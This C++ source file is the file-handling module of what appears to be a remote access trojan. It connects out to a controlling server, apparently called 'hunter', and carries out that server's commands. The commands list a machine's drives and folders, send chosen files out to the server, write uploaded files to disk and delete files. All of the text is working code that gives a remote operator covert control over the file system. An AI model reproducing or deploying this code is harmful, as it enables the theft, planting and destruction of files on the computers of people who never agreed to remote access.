#include "pch.h"
#include "File.h"

static File gFile;

File::File() {

	CmdGetDirFiles = "GET_DIRS_FILES";
	CmdDownloadFile = "DOWNLOAD_FILE";
	CmdUploadFile = "UPLOAD_FILE";
	CmdDeleteFile = "DELETE_FILE";

	CmdSendDrives = "SEND_DRIVES";
	CmdSendDirs = "SEND_DIRS";
	CmdSendFiles = "SEND_FILES";
	CmdDeleteFileSuccess = "DELETE_SUCCESS";
	CmdDeleteFileFailed = "DELETE_FAILED";

	CmdSplit = ";";
	CmdEnd = "\r\n";
	CmdFileSplit = "|";
}

void File::startByNewThread(std::string domain, int port)
{
	// 将域名和端口合并为一个char*
	// 这里new出来的空间在fileThreadProc中delete
	char* args = new char[MAX_PATH + sizeof(int)];
	domain.reserve(MAX_PATH);
	memcpy(args, domain.data(), MAX_PATH);
	memcpy(args + MAX_PATH, (char*)&port, sizeof(int));

	// 传入刚出炉的char*参数
	HANDLE h = CreateThread(NULL, 0, File::fileThreadProc, (LPVOID)args, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
	}
}

DWORD File::fileThreadProc(LPVOID args)
{
	// 获取传入的域名和端口信息
	char domain[MAX_PATH];
	memcpy(domain, args, MAX_PATH);
	int port = *((int*)((char*)args + MAX_PATH));

	startFile(domain, port);
	// 不忘记delete
	delete [] (char*)args;
	return true;
}

void File::startFile(std::string domain, int port)
{
	TcpSocket sock;
	if (!sock.connectTo(domain, port)) {
		OutputDebugStringA("Failed to connect server for file\r\n");
	}

	OutputDebugStringA("Started file\r\n");

	const int packetSize = 800;
	char szData[packetSize];
	int ret;
	std::string buf;

	while (true) {
		// 无数据会引起阻塞 防止占用cpu
		ret = sock.recvData(szData, packetSize);

		if (ret == SOCKET_ERROR || ret == 0) {
			break;
		}
		// 将收到的数据加入到buffer
		addDataToBuffer(&sock, buf, szData, ret);
	}

	OutputDebugStringA("Finished file\r\n");
}

void File::addDataToBuffer(TcpSocket* sock, std::string& buf, char* data, int size)
{
	buf.append(data, size);

	// 分割每条命令和参数并执行
	int endIndex;
	while ((endIndex = buf.find(gFile.CmdEnd)) >= 0) {
		std::string line = buf.substr(0, endIndex);
		buf.erase(0, endIndex + gFile.CmdEnd.length());

		int firstSplit = line.find(gFile.CmdSplit);
		std::string cmd = line.substr(0, firstSplit);
		line.erase(0, firstSplit + gFile.CmdSplit.length());
		// 执行本命令
		processCmd(sock, cmd, line);
	}
}

// 解析出参数 返回映射 和食物主线程里的解析是一样的道理
std::map<std::string, std::string> File::parseArgs(std::string& data)
{
	std::vector<std::string> v;
	std::string::size_type pos1, pos2;
	pos2 = data.find(gFile.CmdSplit);
	pos1 = 0;
	while (std::string::npos != pos2) {
		v.push_back(data.substr(pos1, pos2 - pos1));
		pos1 = pos2 + gFile.CmdSplit.size();
		pos2 = data.find(gFile.CmdSplit, pos1);
	}
	if (pos1 != data.length()) v.push_back(data.substr(pos1));

	std::map<std::string, std::string> args;
	for (int i = 0; i < (int)v.size() - 1; i += 2) {
		args[v.at(i)] = v.at(i + 1);
	}

	return args;
}

void File::processCmd(TcpSocket* sock, std::string& cmd, std::string& data)
{
	std::map<std::string, std::string> args = parseArgs(data);

	if (cmd == gFile.CmdGetDirFiles) {
		doGetDirFiles(sock, args);
		return;
	}

	if (cmd == gFile.CmdDownloadFile) {
		doDownloadFile(sock, args);
		return;
	}

	if (cmd == gFile.CmdUploadFile) {
		doUploadFile(sock, args);
		return;
	}

	if (cmd == gFile.CmdDeleteFile) {
		doDeleteFile(sock, args);
		return;
	}
}

void File::doGetDirFiles(TcpSocket* sock, std::map<std::string, std::string>& args)
{
	std::string dir = args["DIR"];
	std::string data; // 返回数据

	// 如果为空 表示获取盘符
	if (dir.size() == 0) {
		std::vector<std::string> drives;
		drives = getDrives();

		// 将盘符信息打包为数据并发送
		data.append(gFile.CmdSendDrives + gFile.CmdSplit);
		data.append("DRIVES" + gFile.CmdSplit);
		// 多个盘符信息
		int max = drives.size();
		for (int i = 0; i < max; ++i) {
			data.append(drives[i] + gFile.CmdFileSplit);
		}
		// 去掉多余分隔符
		if (drives.size() > 0) {
			data.erase(data.size() - 1);
		}
		data.append(gFile.CmdEnd);
		// 发送
		sock->sendData(data.data(), data.size());
	}
	else {
		// DIR参数不为空的情况 指定了要获取路径的目录
		std::vector<std::string> files;
		std::vector<std::string> dirs;
		// 获取该路径下的目录和文件
		dirs = getDirs(dir);
		files = getFiles(dir);
		// 构造返回数据
		// 加入路径下路径
		data.append(gFile.CmdSendDirs + gFile.CmdSplit);
		data.append("DIR" + gFile.CmdSplit + dir + gFile.CmdSplit);
		data.append("DIRS" + gFile.CmdSplit);

		int max = dirs.size();
		for (int i = 0; i < max; ++i) {
			data.append(dirs[i] + gFile.CmdFileSplit);
		}
		// 去掉多余的分隔符
		if (dirs.size() > 0) {
			data.erase(data.size() - 1);
		}
		data.append(gFile.CmdEnd);
		// 加入路径下文件
		data.append(gFile.CmdSendFiles + gFile.CmdSplit);
		data.append("DIR" + gFile.CmdSplit + dir + gFile.CmdSplit);
		data.append("FILES" + gFile.CmdSplit);

		max = files.size();
		for (int i = 0; i < max; ++i) {
			data.append(files[i] + gFile.CmdFileSplit);
		}
		// 去掉多余的分隔符
		if (files.size()) {
			data.erase(data.size() - 1);
		}
		data.append(gFile.CmdEnd);
		// 发送数据
		sock->sendData(data.data(), data.size());
	}

}

void File::doDownloadFile(TcpSocket* sock, std::map<std::string, std::string>& args)
{
	std::string filePath = args["FILE_PATH"];
	int port = atoi(args["PORT"].data());

	startSendFileByNewThread(filePath, sock->mIp, port);
}

void File::doUploadFile(TcpSocket* sock, std::map<std::string, std::string>& args)
{
	std::string filePath = args["FILE_PATH"];
	int port = atoi(args["PORT"].data());

	startRecvFileByNewThread(filePath, sock->mIp, port);
}

void File::doDeleteFile(TcpSocket* sock, std::map<std::string, std::string>& args)
{
	bool  ret = DeleteFileA(args["FILE_PATH"].data());
	std::string data;
	if (ret) {
		data.append(gFile.CmdDeleteFileSuccess);
		data.append(gFile.CmdEnd);
		sock->sendData(data.data(), data.size());
	}
	else {
		data.append(gFile.CmdDeleteFileFailed);
		data.append(gFile.CmdEnd);
		sock->sendData(data.data(), data.size());
	}
}

std::vector<std::string> File::getDrives()
{
	std::vector<std::string> drives;

	for (int i = 'b'; i <= 'z'; i++) {
		char d[MAX_PATH];
		sprintf_s(d, sizeof(d),"%c:\\*", i);

		WIN32_FIND_DATAA findData;
		HANDLE h = FindFirstFileA(d, &findData);
		if (h != INVALID_HANDLE_VALUE) {
			d[strlen(d) - 1] = '\0'; // 去掉*号 构造为零结尾字符串
			drives.push_back(d);

			FindClose(h);
		}
	}

	return drives;
}

std::vector<std::string> File::getDirs(std::string dir)
{
	WIN32_FIND_DATAA findData;
	HANDLE hFind = FindFirstFileA(dir.append("\\*").data(), &findData);
	std::vector<std::string> files;
	// 该路径下无任何路径
	if (hFind == INVALID_HANDLE_VALUE) {
		return files;
	}

	while (FindNextFileA(hFind, &findData)) {
		// 不要遍历.和.. 防止死循环
		if (!strcmp(findData.cFileName, "..") || !strcmp(findData.cFileName, ".")) {
			continue;
		}
		// 如果是目录就收集起来
		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			files.push_back(findData.cFileName);
		}
	}

	FindClose(hFind);

	return files;
}

std::vector<std::string> File::getFiles(std::string dir)
{
	WIN32_FIND_DATAA findData;
	HANDLE hFind = FindFirstFileA(dir.append("\\*").data(), &findData);
	std::vector<std::string> files;

	if (hFind == INVALID_HANDLE_VALUE) {
		return files;
	}

	while (FindNextFileA(hFind, &findData)) {
		// 不要遍历.和.. 防止死循环
		if (!strcmp(findData.cFileName, "..") || !strcmp(findData.cFileName, ".")) {
			continue;
		}
		// 这里是收集不是目录的文件
		if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			files.push_back(findData.cFileName);
		}
	}

	FindClose(hFind);

	return files;
}

void File::startSendFileByNewThread(std::string filePath, std::string domain, int port)
{
	// 构造发送给sendFileThreadProc线程函数的参数
	char* args = new char[MAX_PATH + MAX_PATH + sizeof(int)];

	// 这里为filePath和domain预留空间的原因是
	// 确保有这么多空间的内容可以复制 否则会出错
	filePath.reserve(MAX_PATH);
	memcpy(args, filePath.data(), MAX_PATH);

	domain.reserve(MAX_PATH);
	memcpy(args + MAX_PATH, domain.data(), MAX_PATH);

	memcpy(args + MAX_PATH + MAX_PATH, (char*)&port, sizeof(int));

	HANDLE h = CreateThread(NULL, 0, File::sendFileThreadProc, (LPVOID)args, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
	}
}

DWORD File::sendFileThreadProc(LPVOID args)
{
	// 获取传进来的参数
	char filePath[MAX_PATH], domain[MAX_PATH];
	memcpy(filePath, (char*)args, MAX_PATH);
	memcpy(domain, (char*)args + MAX_PATH, MAX_PATH);
	int port = *((int*)((char*)args + MAX_PATH + MAX_PATH));
	// 真是一层层调用呀 一个sendFile就要好几个函数参与
	startSendFile(filePath, domain, port);
	// 释放为传参而申请的空间
	delete [] (char*)args;
	return true;
}

// 真正的sendFile来了
void File::startSendFile(std::string filePath, std::string domain, int port)
{
	// 单独建立一个连接
	TcpSocket sock;
	if (!sock.connectTo(domain, port)) {
		OutputDebugStringA("Failed to connect server for send file\r\n");
		return;
	}

	// 二进制形式打开（这里用来c语言文件流）
	FILE* fp;
	errno_t err = fopen_s(&fp,filePath.data(), "rb");
	if (err != 0) {
		sock.dissconnect();

		OutputDebugStringA("Failed to open file for send file\r\n");
		return;
	}

	// 改变文件流读写位置到尾部
	fseek(fp, 0, SEEK_END);
	unsigned int len = ftell(fp); // 获取此时尾部的偏移
	rewind(fp); // 用于将文件指针重新指向文件的开头，同时清除和文件流相关的错误和eof标记

	// 获取文件名和后缀
	char name[_MAX_FNAME], ext[_MAX_EXT];
	_splitpath_s(filePath.data(), NULL, 0, NULL, 0, name, sizeof(name), ext, sizeof(ext));

	// 构造自定义数据包头 先发送包头 告诉文件大小(字节)
	FileHeader header;
	sprintf_s(header.fileName, sizeof(header.fileName), "%s%s", name, ext);
	header.len = len;
	sock.sendData((char*)&header, sizeof(header));

	// 分段发送
	const unsigned int packetLen = 800;
	char data[800];
	unsigned int pos = 0;

	while (pos < len) {
		int sendSize = (pos + packetLen) > len ? len - pos : packetLen;

		fread(data, 1, sendSize, fp);

		if (!sock.sendData(data, sendSize)) {
			return;
		}

		pos += sendSize;
	}

	fclose(fp);
}

void File::startRecvFileByNewThread(std::string filePath, std::string domain, int port)
{
	// 构造给线程函数的参数
	char* args = new char[MAX_PATH + MAX_PATH + sizeof(int)];

	filePath.reserve(MAX_PATH);
	memcpy(args, filePath.data(), MAX_PATH);

	domain.reserve(MAX_PATH);
	memcpy(args + MAX_PATH, domain.data(), MAX_PATH);

	memcpy(args + MAX_PATH + MAX_PATH, (char*)&port, sizeof(int));

	HANDLE h = CreateThread(NULL, 0, File::recvFileThreadProc, (LPVOID)args, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
	}
}

DWORD File::recvFileThreadProc(LPVOID args)
{
	// 单独开线程连接hunter执行操作
	char filePath[MAX_PATH], domain[MAX_PATH];
	memcpy(filePath, args, MAX_PATH);
	memcpy(domain, (char*)args + MAX_PATH, MAX_PATH);
	int port = *((int*)((char*)args + MAX_PATH + MAX_PATH));

	startRecvFile(filePath, domain, port);

	delete [] (char*)args;
	return true;
}

void File::startRecvFile(std::string filePath, std::string domain, int port)
{
	TcpSocket sock;
	if (!sock.connectTo(domain, port)) {
		OutputDebugStringA("Failed to connect server for send file\r\n");
		return;
	}

	// 创建一个文件
	FILE* fp;
	errno_t err = fopen_s(&fp, filePath.data(), "wb");
	if (err != 0) {
		sock.dissconnect();

		OutputDebugStringA("Failed to open file for send file\r\n");
		return;
	}

	// 分段接收
	const int packetLen = 800;
	char data[packetLen];
	while (true) {
		// hunter发送完就关闭套接字 所以这里不存在没有数据堵塞
		int ret = sock.recvData(data, packetLen);

		if (ret == SOCKET_ERROR || ret == 0) {
			break;
		}

		fwrite(data, 1, ret, fp);
	}

	if (fp) {
		fclose(fp);
	}
}
